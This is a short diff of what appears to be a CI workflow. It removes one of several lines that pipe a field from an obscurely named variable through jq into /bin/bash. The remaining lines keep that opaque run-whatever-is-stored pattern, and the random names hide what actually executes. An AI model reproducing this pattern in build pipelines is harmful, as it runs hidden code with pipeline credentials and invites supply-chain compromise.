@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$vjf1" | jq -r .us31 | /bin/bash
           echo $njwwt88398 | jq -r .r147 | /bin/bash
           echo $gd6117 | jq -r .xbig0359 | /bin/bash
-          echo $wjqf743 | jq -r .q395 | /bin/bash
           echo $clafh58223 | jq -r .vgxst63742 | /bin/bash
           echo $fpff3715 | jq -r .ztanz29 | /bin/bash
 
